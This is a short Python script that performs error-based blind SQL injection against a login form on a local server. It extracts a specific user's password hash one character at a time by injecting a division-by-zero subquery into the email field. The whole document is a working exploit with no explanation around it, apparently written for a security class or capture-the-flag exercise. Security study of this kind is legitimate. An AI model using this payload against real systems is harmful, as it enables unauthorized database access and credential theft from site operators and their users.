import requests

BASE_URL = 'http://localhost:8888'

characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

hashed_password = ''
i = 1

while True:
    found_char = False
    for c in characters:
        payload = f"' AND (SELECT 1/((SELECT ASCII(SUBSTR(password,{i},1)) FROM users WHERE email='kelompok8@ethack.id') - ASCII('{c}'))) IS NULL AND ''='"
        data = { 'email': payload, 'password': ''}
        response = requests.post(f'{BASE_URL}/auth/login', data)
        
        if 'Server error' in response.text:
            hashed_password += c
            print(f'Current password: {hashed_password}')
            found_char = True
            break
    
    if not found_char:
        break
    
    i += 1

print(f'Found Password: {hashed_password}')